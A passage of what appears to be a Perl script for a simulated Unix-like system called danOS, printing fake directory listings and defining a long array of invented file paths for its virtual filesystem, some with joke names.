   print STDERR << "EOT"
drwxr-xr-x   2 root     bin          4096 Jan  2 20:00$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
-rwxr-xr-x   1 root     bin          7796 Oct 22  1999$verde_claro in.comsat$normal
-rwxr-xr-x   1 root     bin          7256 Oct 22  1999$verde_claro in.fingerd$normal
-rwxr-xr-x   1 root     bin         22220 Oct 22  1999$verde_claro in.identd$normal
-rwxr-xr-x   1 root     root        40048 Apr 27  2000$verde_claro in.newtelnetd$normal
-rwxr-xr-x   1 root     root        26300 Jul 27  2000$verde_claro in.pop3d$normal
-rwxr-xr-x   1 root     bin          7436 Oct 22  1999$verde_claro in.rexecd$normal
-rwxr-xr-x   1 root     bin         12324 Oct 22  1999$verde_claro in.rlogind$normal
-rwxr-xr-x   1 root     bin         10736 Oct 22  1999$verde_claro in.rshd$normal
-rwxr-xr-x   1 root     bin         12824 Oct 22  1999$verde_claro in.talkd$normal
-rwxr-xr-x   1 root     bin         35360 Oct 22  1999$verde_claro in.telnetd$normal
-rwxr-xr-x   1 root     bin         35360 Oct 25  1999$verde_claro in.telnetsnoopd$normal
-rwxr-xr-x   1 root     bin          9604 Oct 22  1999$verde_claro in.tftpd$normal
-rwxr-xr-x   1 root     bin         46624 Oct 22  1999$verde_claro in.timed$normal
-rwxr-xr-x   1 root     bin          4816 Oct 22  1999$verde_claro in.writed$normal
-rwxr-xr-x   1 root     bin         17828 Oct 22  1999$verde_claro inetd$normal
-rwxr-xr-x   1 root     bin          4020 Oct 25  1999$verde_claro ipmasqadm$normal
-rwxr-xr-x   1 root     bin        583296 Oct 22  1999$verde_claro ipop3d$normal
-rwxr-xr-x   1 root     bin         20280 Oct  9  1999$verde_claro klogd$normal
-rwxr-xr-x   1 root     root         3438 Mar 28  2000$verde_claro ppp-go$normal
-rwxr-xr-x   1 root     bin          1859 Jan 17  1998$verde_claro ppp-off$normal
-rwxr-xr-x   1 root     bin        141364 Sep 30  1999$verde_claro pppd$normal
-rwxr-xr-x   1 root     bin         58436 Sep 30  1999$verde_claro pppsetup$normal
-rwxr-xr-x   1 root     bin          9172 Sep 30  1999$verde_claro pppstats$normal
-rwxr-xr-x   1 root     bin         10312 Oct 22  1999$verde_claro rpc.bootparamd$normal
-rwxr-xr-x   1 root     bin         31288 Oct 22  1999$verde_claro rpc.bwnfsd$normal
-rwxr-xr-x   1 root     bin         62004 Oct 22  1999$verde_claro rpc.mountd$normal
-rwxr-xr-x   1 root     bin         60460 Oct 22  1999$verde_claro rpc.nfsd$normal
-rwxr-xr-x   1 root     bin         37164 Oct 22  1999$verde_claro rpc.pcnfsd$normal
-rwxr-xr-x   1 root     bin          8552 Oct 22  1999$verde_claro rpc.rusersd$normal
-rwxr-xr-x   1 root     bin          6740 Oct 22  1999$verde_claro rpc.rwalld$normal
-rwxr-xr-x   1 root     bin         18224 Oct 25  1999$verde_claro rpc.yppasswdd$normal
-rwxr-xr-x   1 root     bin         37256 Oct 25  1999$verde_claro rpc.ypxfrd$normal
-r-xr-xr-x   1 root     bin        388170 Apr 27  2000$verde_claro sendmail$normal
-rwxr-xr-x   1 root     bin         27684 Oct  9  1999$verde_claro syslogd$normal
-rwxr-xr-x   1 root     bin         21744 Oct 22  1999$verde_claro tcpd$normal
-rwxr-xr-x   1 root     bin         26112 Oct 22  1999$verde_claro tcpdchk$normal
-rwxr-xr-x   1 root     bin         26480 Oct 22  1999$verde_claro tcpdmatch$normal
-rwxr-xr-x   1 root     bin          3604 Oct  7  1999$verde_claro tickadj$normal
-rwxr-xr-x   1 root     bin        151532 Oct 22  1999$verde_claro wu.ftpd$normal
EOT
}

sub list_82
{
   # /var
   print STDERR << "EOT"
drwxr-xr-x  18 root     root         4096 Jan  1  2000$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
drwxr-xr-x   8 root     root         4096 Apr 27  2000$azul_claro lib$normal
drwxr-xr-x  18 root     root         4096 Apr 27  2000$azul_claro spool$normal
EOT
}

sub list_83
{
   # /var/lib
   print STDERR << "EOT"
drwxr-xr-x   8 root     root         4096 Apr 27  2000$azul_claro .$normal
drwxr-xr-x  18 root     root         4096 Jan  1  2000$azul_claro ..$normal
drwxr-xr-x  13 root     root         4096 Aug 26  1999$azul_claro apache$normal
EOT
}

sub list_84
{
   # /var/lib/apache
   print STDERR << "EOT"
drwxr-xr-x  13 root     root         4096 Aug 26  1999$azul_claro .$normal
drwxr-xr-x   8 root     root         4096 Apr 27  2000$azul_claro ..$normal
-rw-r--r--   1 root     root        12957 Mar 31  1999 ABOUT_APACHE$normal
-rw-r--r--   1 root     root         3679 Mar 22  1999 Announcement$normal
-rw-r--r--   1 root     root        27293 Aug  9  1999 INSTALL$normal
-rw-r--r--   1 root     root        33398 Aug  7  1999 KEYS$normal
-rw-r--r--   1 root     root         2848 Jan  1  1999 LICENSE$normal
-rw-r--r--   1 root     root        26414 Aug 13  1999 Makefile.tmpl$normal
-rw-r--r--   1 root     root         2046 Apr  1  1998 README$normal
-rw-r--r--   1 root     root         3132 Mar 19  1999 README.NT$normal
-rw-r--r--   1 root     root        11687 Feb  7  1999 README.configure$normal
-rw-r--r--   1 root     root          331 Sep 21  1998 WARNING-NT.TXT$normal
-rwxr-xr-x   1 root     root        52983 Aug 14  1999$verde_claro configure$normal
EOT
}

sub list_85
{
   # /var/spool
   print STDERR << "EOT"
drwxr-xr-x  18 root     root         4096 Apr 27  2000$azul_claro .$normal
drwxr-xr-x  18 root     root         4096 Jan  1  2000$azul_claro ..$normal
EOT
}

sub list_86
{
   # /misc/drivers
   print STDERR << "EOT"
drwxr-xr-x  18 root     root         4096 Apr 27  2000$azul_claro .$normal
drwxr-xr-x  18 root     root         4096 Jan  1  2000$azul_claro ..$normal
drwxr-xr-x   2 root     root         4096 May 26  1994$azul_claro modem$normal
drwxr-xr-x   2 root     root         4096 May 26  1994$azul_claro usb$normal
drwxr-xr-x   2 root     root         4096 May 26  1994$azul_claro video$normal
drwxr-xr-x   2 root     root         4096 May 26  1994$azul_claro sound$normal
drwxr-xr-x   2 root     root         4096 May 26  1994$azul_claro net$normal
EOT
}

sub list_87
{
   # /misc/cnm
   print STDERR << "EOT"
drwxr-xr-x  18 root     root         4096 Apr 27  2000$azul_claro .$normal
drwxr-xr-x  18 root     root         4096 Jan  1  2000$azul_claro ..$normal
-rwx------   2 root     root      2221336 May 26  1994$verde_claro control$normal
-rwx------   2 root     root         2824 May 26  1994 signatures$normal
EOT
}

@files = (
"/vmdanOS",
"/bin/arch",
"/bin/bash",
"/bin/cat",
"/bin/date",
"/bin/df",
"/bin/echo",
"/bin/hostname",
"/bin/kill",
"/bin/killall",
"/bin/login",
"/bin/ls",
"/bin/mount",
"/bin/umount",
"/bin/netstat",
"/bin/ps",
"/bin/pwd",
"/bin/su",
"/bin/uname",
"/boot/System.map",
"/boot/boot.0200",
"/boot/boot.0300",
"/boot/boot.0305",
"/boot/boot.b",
"/boot/boot_message.txt",
"/boot/chain.b",
"/boot/config",
"/boot/map",
"/boot/os2_d.b",
"/dev/MAKEDEV",
"/dev/README.MAKEDEV",
"/dev/apm_bios",
"/dev/atibm",
"/dev/audio",
"/dev/audio1",
"/dev/aztcd",
"/dev/beep",
"/dev/bkd",
"/dev/cdu535",
"/dev/cm206cd",
"/dev/console",
"/dev/cua0",
"/dev/cua1",
"/dev/cua10",
"/dev/cua11",
"/dev/cua12",
"/dev/cua13",
"/dev/cua14",
"/dev/cua15",
"/dev/cua16",
"/dev/cua17",
"/dev/cua18",
"/dev/cua19",
"/dev/cua2",
"/dev/cua20",
"/dev/cua21",
"/dev/cua22",
"/dev/cua23",
"/dev/cua24",
"/dev/cua25",
"/dev/cua26",
"/dev/cua27",
"/dev/cua28",
"/dev/cua29",
"/dev/cua3",
"/dev/cua30",
"/dev/cua31",
"/dev/cua4",
"/dev/cua5",
"/dev/cua6",
"/dev/cua7",
"/dev/cua8",
"/dev/cua9",
"/dev/cub0",
"/dev/cub1",
"/dev/cub10",
"/dev/cub11",
"/dev/cub12",
"/dev/cub13",
"/dev/cub14",
"/dev/cub15",
"/dev/cub2",
"/dev/cub3",
"/dev/cub4",
"/dev/cub5",
"/dev/cub6",
"/dev/cub7",
"/dev/cub8",
"/dev/cub9",
"/dev/cui0",
"/dev/cui1",
"/dev/cui10",
"/dev/cui11",
"/dev/cui12",
"/dev/cui13",
"/dev/cui14",
"/dev/cui15",
"/dev/cui16",
"/dev/cui17",
"/dev/cui18",
"/dev/cui19",
"/dev/cui2",
"/dev/cui20",
"/dev/cui21",
"/dev/cui22",
"/dev/cui23",
"/dev/cui24",
"/dev/cui25",
"/dev/cui26",
"/dev/cui27",
"/dev/cui28",
"/dev/cui29",
"/dev/cui3",
"/dev/cui30",
"/dev/cui31",
"/dev/cui32",
"/dev/cui33",
"/dev/cui34",
"/dev/cui35",
"/dev/cui36",
"/dev/cui37",
"/dev/cui38",
"/dev/cui39",
"/dev/cui4",
"/dev/cui40",
"/dev/cui41",
"/dev/cui42",
"/dev/cui43",
"/dev/cui44",
"/dev/cui45",
"/dev/cui46",
"/dev/cui47",
"/dev/cui48",
"/dev/cui49",
"/dev/cui5",
"/dev/cui50",
"/dev/cui51",
"/dev/cui52",
"/dev/cui53",
"/dev/cui54",
"/dev/cui55",
"/dev/cui56",
"/dev/cui57",
"/dev/cui58",
"/dev/cui59",
"/dev/cui6",
"/dev/cui60",
"/dev/cui61",
"/dev/cui62",
"/dev/cui63",
"/dev/cui7",
"/dev/cui8",
"/dev/cui9",
"/dev/dsp",
"/dev/dsp1",
"/dev/eda",
"/dev/eda1",
"/dev/eda10",
"/dev/eda11",
"/dev/eda12",
"/dev/eda13",
"/dev/eda14",
"/dev/eda15",
"/dev/eda16",
"/dev/eda2",
"/dev/eda3",
"/dev/eda4",
"/dev/eda5",
"/dev/eda6",
"/dev/eda7",
"/dev/eda8",
"/dev/eda9",
"/dev/edb",
"/dev/edb1",
"/dev/edb10",
"/dev/edb11",
"/dev/edb12",
"/dev/edb13",
"/dev/edb14",
"/dev/edb15",
"/dev/edb16",
"/dev/edb2",
"/dev/edb3",
"/dev/edb4",
"/dev/edb5",
"/dev/edb6",
"/dev/edb7",
"/dev/edb8",
"/dev/edb9",
"/dev/extrap",
"/dev/fb0",
"/dev/fb1",
"/dev/fb2",
"/dev/fb3",
"/dev/fb4",
"/dev/fb5",
"/dev/fb6",
"/dev/fb7",
"/dev/fd0",
"/dev/fd0.save",
"/dev/fd0CompaQ",
"/dev/fd0d360",
"/dev/fd0h1200",
"/dev/fd0h1440",
"/dev/fd0h1476",
"/dev/fd0h1494",
"/dev/fd0h1600",
"/dev/fd0h360",
"/dev/fd0h410",
"/dev/fd0h420",
"/dev/fd0h720",
"/dev/fd0h880",
"/dev/fd0u1040",
"/dev/fd0u1120",
"/dev/fd0u1440",
"/dev/fd0u1600",
"/dev/fd0u1680",
"/dev/fd0u1722",
"/dev/fd0u1743",
"/dev/fd0u1760",
"/dev/fd0u1840",
"/dev/fd0u1920",
"/dev/fd0u2880",
"/dev/fd0u3200",
"/dev/fd0u3520",
"/dev/fd0u360",
"/dev/fd0u3840",
"/dev/fd0u720",
"/dev/fd0u800",
"/dev/fd0u820",
"/dev/fd0u830",
"/dev/fd1",
"/dev/fd1CompaQ",
"/dev/fd1d360",
"/dev/fd1h1200",
"/dev/fd1h1440",
"/dev/fd1h1476",
"/dev/fd1h1494",
"/dev/fd1h1600",
"/dev/fd1h360",
"/dev/fd1h410",
"/dev/fd1h420",
"/dev/fd1h720",
"/dev/fd1h880",
"/dev/fd1u1040",
"/dev/fd1u1120",
"/dev/fd1u1440",
"/dev/fd1u1600",
"/dev/fd1u1680",
"/dev/fd1u1722",
"/dev/fd1u1743",
"/dev/fd1u1760",
"/dev/fd1u1840",
"/dev/fd1u1920",
"/dev/fd1u2880",
"/dev/fd1u3200",
"/dev/fd1u3520",
"/dev/fd1u360",
"/dev/fd1u3840",
"/dev/fd1u720",
"/dev/fd1u800",
"/dev/fd1u820",
"/dev/fd1u830",
"/dev/fd2",
"/dev/fd2CompaQ",
"/dev/fd2d360",
"/dev/fd2h1200",
"/dev/fd2h1440",
"/dev/fd2h1476",
"/dev/fd2h1494",
"/dev/fd2h1600",
"/dev/fd2h360",
"/dev/fd2h410",
"/dev/fd2h420",
"/dev/fd2h720",
"/dev/fd2h880",
"/dev/fd2u1040",
"/dev/fd2u1120",
"/dev/fd2u1440",
"/dev/fd2u1600",
"/dev/fd2u1680",
"/dev/fd2u1722",
"/dev/fd2u1743",
"/dev/fd2u1760",
"/dev/fd2u1840",
"/dev/fd2u1920",
"/dev/fd2u2880",
"/dev/fd2u3200",
"/dev/fd2u3520",
"/dev/fd2u360",
"/dev/fd2u3840",
"/dev/fd2u720",
"/dev/fd2u800",
"/dev/fd2u820",
"/dev/fd2u830",
"/dev/fd3",
"/dev/fd3CompaQ",
"/dev/fd3d360",
"/dev/fd3h1200",
"/dev/fd3h1440",
"/dev/fd3h1476",
"/dev/fd3h1494",
"/dev/fd3h1600",
"/dev/fd3h360",
"/dev/fd3h410",
"/dev/fd3h420",
"/dev/fd3h720",
"/dev/fd3h880",
"/dev/fd3u1040",
"/dev/fd3u1120",
"/dev/fd3u1440",
"/dev/fd3u1600",
"/dev/fd3u1680",
"/dev/fd3u1722",
"/dev/fd3u1743",
"/dev/fd3u1760",
"/dev/fd3u1840",
"/dev/fd3u1920",
"/dev/fd3u2880",
"/dev/fd3u3200",
"/dev/fd3u3520",
"/dev/fd3u360",
"/dev/fd3u3840",
"/dev/fd3u720",
"/dev/fd3u800",
"/dev/fd3u820",
"/dev/fd3u830",
"/dev/full",
"/dev/inet/egp",
"/dev/inet/ggp",
"/dev/inet/icmp",
"/dev/inet/idp",
"/dev/inet/ip",
"/dev/inet/ipip",
"/dev/inet/pup",
"/dev/inet/rawip",
"/dev/inet/tcp",
"/dev/inet/udp",
"/dev/pts/0",
"/dev/pts/1",
"/dev/rd/c0d0",
"/dev/rd/c0d0p1",
"/dev/rd/c0d0p2",
"/dev/rd/c0d0p3",
"/dev/rd/c0d0p4",
"/dev/rd/c0d0p5",
"/dev/rd/c0d0p6",
"/dev/rd/c0d0p7",
"/dev/rd/c0d1",
"/dev/rd/c0d10",
"/dev/rd/c0d10p1",
"/dev/rd/c0d10p2",
"/dev/rd/c0d10p3",
"/dev/rd/c0d10p4",
"/dev/rd/c0d10p5",
"/dev/rd/c0d10p6",
"/dev/rd/c0d10p7",
"/dev/rd/c0d11",
"/dev/rd/c0d11p1",
"/dev/rd/c0d11p2",
"/dev/rd/c0d11p3",
"/dev/rd/c0d11p4",
"/dev/rd/c0d11p5",
"/dev/rd/c0d11p6",
"/dev/rd/c0d11p7",
"/dev/rd/c0d12",
"/dev/rd/c0d12p1",
"/dev/rd/c0d12p2",
"/dev/rd/c0d12p3",
"/dev/rd/c0d12p4",
"/dev/rd/c0d12p5",
"/dev/rd/c0d12p6",
"/dev/rd/c0d12p7",
"/dev/rd/c0d13",
"/dev/rd/c0d13p1",
"/dev/rd/c0d13p2",
"/dev/rd/c0d13p3",
"/dev/rd/c0d13p4",
"/dev/rd/c0d13p5",
"/dev/rd/c0d13p6",
"/dev/rd/c0d13p7",
"/dev/rd/c0d14",
"/dev/rd/c0d14p1",
"/dev/rd/c0d14p2",
"/dev/rd/c0d14p3",
"/dev/rd/c0d14p4",
"/dev/rd/c0d14p5",
"/dev/rd/c0d14p6",
"/dev/rd/c0d14p7",
"/dev/rd/c0d15",
"/dev/rd/c0d15p1",
"/dev/rd/c0d15p2",
"/dev/rd/c0d15p3",
"/dev/rd/c0d15p4",
"/dev/rd/c0d15p5",
"/dev/rd/c0d15p6",
"/dev/rd/c0d15p7",
"/dev/rd/c0d16",
"/dev/rd/c0d16p1",
"/dev/rd/c0d16p2",
"/dev/rd/c0d16p3",
"/dev/rd/c0d16p4",
"/dev/rd/c0d16p5",
"/dev/rd/c0d16p6",
"/dev/rd/c0d16p7",
"/dev/rd/c0d17",
"/dev/rd/c0d17p1",
"/dev/rd/c0d17p2",
"/dev/rd/c0d17p3",
"/dev/rd/c0d17p4",
"/dev/rd/c0d17p5",
"/dev/rd/c0d17p6",
"/dev/rd/c0d17p7",
"/dev/rd/c0d18",
"/dev/rd/c0d18p1",
"/dev/rd/c0d18p2",
"/dev/rd/c0d18p3",
"/dev/rd/c0d18p4",
"/dev/rd/c0d18p5",
"/dev/rd/c0d18p6",
"/dev/rd/c0d18p7",
"/dev/rd/c0d19",
"/dev/rd/c0d19p1",
"/dev/rd/c0d19p2",
"/dev/rd/c0d19p3",
"/dev/rd/c0d19p4",
"/dev/rd/c0d19p5",
"/dev/rd/c0d19p6",
"/dev/rd/c0d19p7",
"/dev/rd/c0d1p1",
"/dev/rd/c0d1p2",
"/dev/rd/c0d1p3",
"/dev/rd/c0d1p4",
"/dev/rd/c0d1p5",
"/dev/rd/c0d1p6",
"/dev/rd/c0d1p7",
"/dev/rd/c0d2",
"/dev/rd/c0d20",
"/dev/rd/c0d20p1",
"/dev/rd/c0d20p2",
"/dev/rd/c0d20p3",
"/dev/rd/c0d20p4",
"/dev/rd/c0d20p5",
"/dev/rd/c0d20p6",
"/dev/rd/c0d20p7",
"/dev/rd/c0d21",
"/dev/rd/c0d21p1",
"/dev/rd/c0d21p2",
"/dev/rd/c0d21p3",
"/dev/rd/c0d21p4",
"/dev/rd/c0d21p5",
"/dev/rd/c0d21p6",
"/dev/rd/c0d21p7",
"/dev/rd/c0d22",
"/dev/rd/c0d22p1",
"/dev/rd/c0d22p2",
"/dev/rd/c0d22p3",
"/dev/rd/c0d22p4",
"/dev/rd/c0d22p5",
"/dev/rd/c0d22p6",
"/dev/rd/c0d22p7",
"/dev/rd/c0d23",
"/dev/rd/c0d23p1",
"/dev/rd/c0d23p2",
"/dev/rd/c0d23p3",
"/dev/rd/c0d23p4",
"/dev/rd/c0d23p5",
"/dev/rd/c0d23p6",
"/dev/rd/c0d23p7",
"/dev/rd/c0d24",
"/dev/rd/c0d24p1",
"/dev/rd/c0d24p2",
"/dev/rd/c0d24p3",
"/dev/rd/c0d24p4",
"/dev/rd/c0d24p5",
"/dev/rd/c0d24p6",
"/dev/rd/c0d24p7",
"/dev/rd/c0d25",
"/dev/rd/c0d25p1",
"/dev/rd/c0d25p2",
"/dev/rd/c0d25p3",
"/dev/rd/c0d25p4",
"/dev/rd/c0d25p5",
"/dev/rd/c0d25p6",
"/dev/rd/c0d25p7",
"/dev/rd/c0d26",
"/dev/rd/c0d26p1",
"/dev/rd/c0d26p2",
"/dev/rd/c0d26p3",
"/dev/rd/c0d26p4",
"/dev/rd/c0d26p5",
"/dev/rd/c0d26p6",
"/dev/rd/c0d26p7",
"/dev/rd/c0d27",
"/dev/rd/c0d27p1",
"/dev/rd/c0d27p2",
"/dev/rd/c0d27p3",
"/dev/rd/c0d27p4",
"/dev/rd/c0d27p5",
"/dev/rd/c0d27p6",
"/dev/rd/c0d27p7",
"/dev/rd/c0d28",
"/dev/rd/c0d28p1",
"/dev/rd/c0d28p2",
"/dev/rd/c0d28p3",
"/dev/rd/c0d28p4",
"/dev/rd/c0d28p5",
"/dev/rd/c0d28p6",
"/dev/rd/c0d28p7",
"/dev/rd/c0d29",
"/dev/rd/c0d29p1",
"/dev/rd/c0d29p2",
"/dev/rd/c0d29p3",
"/dev/rd/c0d29p4",
"/dev/rd/c0d29p5",
"/dev/rd/c0d29p6",
"/dev/rd/c0d29p7",
"/dev/rd/c0d2p1",
"/dev/rd/c0d2p2",
"/dev/rd/c0d2p3",
"/dev/rd/c0d2p4",
"/dev/rd/c0d2p5",
"/dev/rd/c0d2p6",
"/dev/rd/c0d2p7",
"/dev/rd/c0d3",
"/dev/rd/c0d30",
"/dev/rd/c0d30p1",
"/dev/rd/c0d30p2",
"/dev/rd/c0d30p3",
"/dev/rd/c0d30p4",
"/dev/rd/c0d30p5",
"/dev/rd/c0d30p6",
"/dev/rd/c0d30p7",
"/dev/rd/c0d31",
"/dev/rd/c0d31p1",
"/dev/rd/c0d31p2",
"/dev/rd/c0d31p3",
"/dev/rd/c0d31p4",
"/dev/rd/c0d31p5",
"/dev/rd/c0d31p6",
"/dev/rd/c0d31p7",
"/dev/rd/c0d3p1",
"/dev/rd/c0d3p2",
"/dev/rd/c0d3p3",
"/dev/rd/c0d3p4",
"/dev/rd/c0d3p5",
"/dev/rd/c0d3p6",
"/dev/rd/c0d3p7",
"/dev/rd/c0d4",
"/dev/rd/c0d4p1",
"/dev/rd/c0d4p2",
"/dev/rd/c0d4p3",
"/dev/rd/c0d4p4",
"/dev/rd/c0d4p5",
"/dev/rd/c0d4p6",
"/dev/rd/c0d4p7",
"/dev/rd/c0d5",
"/dev/rd/c0d5p1",
"/dev/rd/c0d5p2",
"/dev/rd/c0d5p3",
"/dev/rd/c0d5p4",
"/dev/rd/c0d5p5",
"/dev/rd/c0d5p6",
"/dev/rd/c0d5p7",
"/dev/rd/c0d6",
"/dev/rd/c0d6p1",
"/dev/rd/c0d6p2",
"/dev/rd/c0d6p3",
"/dev/rd/c0d6p4",
"/dev/rd/c0d6p5",
"/dev/rd/c0d6p6",
"/dev/rd/c0d6p7",
"/dev/rd/c0d7",
"/dev/rd/c0d7p1",
"/dev/rd/c0d7p2",
"/dev/rd/c0d7p3",
"/dev/rd/c0d7p4",
"/dev/rd/c0d7p5",
"/dev/rd/c0d7p6",
"/dev/rd/c0d7p7",
"/dev/rd/c0d8",
"/dev/rd/c0d8p1",
"/dev/rd/c0d8p2",
"/dev/rd/c0d8p3",
"/dev/rd/c0d8p4",
"/dev/rd/c0d8p5",
"/dev/rd/c0d8p6",
"/dev/rd/c0d8p7",
"/dev/rd/c0d9",
"/dev/rd/c0d9p1",
"/dev/rd/c0d9p2",
"/dev/rd/c0d9p3",
"/dev/rd/c0d9p4",
"/dev/rd/c0d9p5",
"/dev/rd/c0d9p6",
"/dev/rd/c0d9p7",
"/dev/rd/c1d0",
"/dev/rd/c1d0p1",
"/dev/rd/c1d0p2",
"/dev/rd/c1d0p3",
"/dev/rd/c1d0p4",
"/dev/rd/c1d0p5",
"/dev/rd/c1d0p6",
"/dev/rd/c1d0p7",
"/dev/rd/c1d1",
"/dev/rd/c1d10",
"/dev/rd/c1d10p1",
"/dev/rd/c1d10p2",
"/dev/rd/c1d10p3",
"/dev/rd/c1d10p4",
"/dev/rd/c1d10p5",
"/dev/rd/c1d10p6",
"/dev/rd/c1d10p7",
"/dev/rd/c1d11",
"/dev/rd/c1d11p1",
"/dev/rd/c1d11p2",
"/dev/rd/c1d11p3",
"/dev/rd/c1d11p4",
"/dev/rd/c1d11p5",
"/dev/rd/c1d11p6",
"/dev/rd/c1d11p7",
"/dev/rd/c1d12",
"/dev/rd/c1d12p1",
"/dev/rd/c1d12p2",
"/dev/rd/c1d12p3",
"/dev/rd/c1d12p4",
"/dev/rd/c1d12p5",
"/dev/rd/c1d12p6",
"/dev/rd/c1d12p7",
"/dev/rd/c1d13",
"/dev/rd/c1d13p1",
"/dev/rd/c1d13p2",
"/dev/rd/c1d13p3",
"/dev/rd/c1d13p4",
"/dev/rd/c1d13p5",
"/dev/rd/c1d13p6",
"/dev/rd/c1d13p7",
"/dev/rd/c1d14",
"/dev/rd/c1d14p1",
"/etc/DIR_COLORS",
"/etc/HOSTNAME",
"/etc/NETWORKING",
"/etc/XF86Config",
"/etc/aliases",
"/etc/aliases.db",
"/etc/conf.modules",
"/etc/dhcpd.conf",
"/etc/diphosts",
"/etc/dircolors",
"/etc/exports",
"/etc/fdprm",
"/etc/fstab",
"/etc/ftpaccess",
"/etc/ftpconversions_k",
"/etc/ftpgroups",
"/etc/ftpusers",
"/etc/gateways",
"/etc/gettydefs",
"/etc/gpm-root.conf",
"/etc/gpm-syn.conf",
"/etc/gpm-twiddler.conf",
"/etc/group",
"/etc/host.conf",
"/etc/hosts",
"/etc/hosts.allow",
"/etc/hosts.deny",
"/etc/hosts.equiv",
"/etc/hosts.lpd",
"/etc/inetd.conf",
"/etc/inittab",
"/etc/inputrc",
"/etc/issue",
"/etc/issue.net",
"/etc/ld.so.cache",
"/etc/ld.so.conf",
"/etc/lilo.conf",
"/etc/login.access",
"/etc/login.defs",
"/etc/magic",
"/etc/mail.rc",
"/etc/modules.conf",
"/etc/motd",
"/etc/mtab",
"/etc/named.boot",
"/etc/named.conf",
"/etc/netgroup",
"/etc/networks",
"/etc/organization",
"/etc/papd.conf",
"/etc/passwd",
"/etc/profile",
"/etc/protocols",
"/etc/resolv.conf",
"/etc/rpc",
"/etc/securetty",
"/etc/services",
"/etc/shadow",
"/etc/shells",
"/etc/danOS-version",
"/etc/snooptab",
"/etc/syslog.conf",
"/etc/termcap",
"/etc/wgetrc",
"/etc/default/getty.ttyS1",
"/etc/default/uugetty.ttyS0-sample",
"/etc/default/uugetty.ttyS1",
"/etc/default/uugetty.ttyS1.1",
"/etc/default/uugetty.ttyS1.works",
"/etc/default/uugetty.ttyS1~",
"/etc/default/uugetty.ttyS3.unused",
"/etc/dhcpc/dhcpcd-eth0.exe",
"/etc/httpd/conf/access.conf",
"/etc/httpd/conf/httpd.conf",
"/etc/httpd/conf/magic",
"/etc/httpd/conf/mime.types",
"/etc/httpd/conf/srm.conf",
"/etc/mail/aliases.db",
"/etc/mail/helpfile",
"/etc/mail/sendmail.cf",
"/etc/mail/sendmail.mc",
"/etc/mail/sendmail.st",
"/etc/mail/statistics",
"/etc/pam.d/ssh",
"/etc/ppp/chap-secrets",
"/etc/ppp/ip-down",
"/etc/ppp/ip-up",
"/etc/ppp/options",
"/etc/ppp/options.demand",
"/etc/ppp/pap-secrets",
"/etc/ppp/pppscript",
"/etc/ppp/pppsetup.txt",
"/etc/ppp/peers/wvdial",
"/etc/profile.d/kde.csh",
"/etc/profile.d/kde.sh",
"/etc/profile.d/qt.csh",
"/etc/profile.d/qt.sh",
"/etc/rc.d/rc.4",
"/etc/rc.d/rc.6",
"/etc/rc.d/rc.K",
"/etc/rc.d/rc.M",
"/etc/rc.d/rc.S",
"/etc/rc.d/rc.atalk",
"/etc/rc.d/rc.cdrom",
"/etc/rc.d/rc.font.sample",
"/etc/rc.d/rc.gpm",
"/etc/rc.d/rc.httpd",
"/etc/rc.d/rc.ibcs2",
"/etc/rc.d/rc.inet1",
"/etc/rc.d/rc.inet2",
"/etc/rc.d/rc.local",
"/etc/rc.d/rc.modules",
"/etc/rc.d/rc.pcmcia",
"/etc/rc.d/rc.samba",
"/etc/rc.d/rc.serial",
"/etc/rc.d/rc.sysvinit",
"/etc/rc.d/rc.ids",
"/etc/rc.d/init.d/ippl",
"/etc/rc.d/init.d/postgresql",
"/etc/rc.d/init.d/quake-server",
"/etc/rc.d/init.d/sshd",
"/etc/vga/dvorak-us.keymap",
"/etc/vga/libvga.config",
"/etc/vga/libvga.et4000",
"/etc/vga/libvga.et6000",
"/etc/vga/null.keymap",
"/etc/msgs/mirrors.msg",
"/etc/msgs/msg.dead",
"/etc/msgs/msg.toomany",
"/etc/msgs/welcome.msg",
"/home/ftp/bin/ls",
"/home/ftp/tmp/p00r.c",
"/home/joao/.bash_history",
"/home/joao/xxx/loira01.jpg",
"/home/joao/xxx/loira02.jpg",
"/home/joao/xxx/loira03.jpg",
"/home/joao/xxx/loira04.jpg",
"/home/joao/xxx/praia.mpg",
"/home/joao/mp3/u2-walk_on.mp3",
"/home/joao/mp3/u2-beautiful_day.mp3",
"/home/joao/mp3/u2-blood_sunday.mp3",
"/home/joao/mp3/mark_knopfler-that.mp3",
"/home/joao/mp3/dire_straits-brothers_in_arms.mp3",
"/home/joao/mp3/will_smith-mib.mp3",
"/home/joao/mp3/will_smith-wildwest.mp3",
"/home/lorena/.bash_history",
"/home/lorena/recado.txt",
"/home/daniel/.bash_history",
"/home/bill/photos/monica01.jpg",
"/home/bill/photos/monica02.jpg",
"/home/bill/photos/monica03.jpg",
"/home/bill/photos/monica_onthetable.jpg",
"/home/bill/photos/monica_nonstop.mpg",
"/home/bill/mail/sent-mail",
"/lib/ld-2.1.2.so",
"/lib/ld-linux.so.1.9.9",
"/lib/ld.so",
"/lib/libBrokenLocale-2.1.2.so",
"/lib/libSegFault.so",
"/lib/libc-2.1.2.so",
"/lib/libcrypt-2.1.2.so",
"/lib/libncurses.so.4",
"/lib/libncurses.so.5.0",
"/lib/libpcap-nessus.la",
"/lib/libpcap-nessus.so",
"/lib/libpcap-nessus.so.1.0.0",
"/lib/libproc.so.2.0.0",
"/lib/libpthread-0.8.so",
"/lib/libresolv-2.1.2.so",
"/lib/libtermcap.so.2.0.8",
"/lib/libutil-2.1.2.so",
"/misc/ids/ids.log",
"/misc/ids/ids.conf",
"/misc/ids/ids.status",
"/misc/drivers/modem/usr_3com.drv",
"/misc/drivers/modem/motorola.drv",
"/misc/drivers/modem/trellis.drv",
"/misc/drivers/modem/pctel_winmodem.drv",
"/misc/drivers/usb/generic.drv",
"/misc/drivers/video/sis5597.drv",
"/misc/drivers/video/voodoo.drv",
"/misc/drivers/video/diamond.drv",
"/misc/drivers/sound/cmi8330.drv",
"/misc/drivers/sound/cmi8338.drv",
"/misc/drivers/sound/sb.drv",
"/misc/drivers/net/usr_3com.drv",
"/misc/drivers/net/hayes.drv",
"/misc/drivers/net/generic_ethernet.drv",
"/mnt/w95/WinAmp.Log",
"/mnt/w95/autoexec.bak",
"/mnt/w95/autoexec.bat",
"/mnt/w95/autoexec.dos",
"/mnt/w95/bootlog.txt",
"/mnt/w95/command.com",
"/mnt/w95/config.000",
"/mnt/w95/config.bak",
"/mnt/w95/config.dos",
"/mnt/w95/config.nto",
"/mnt/w95/config.sys",
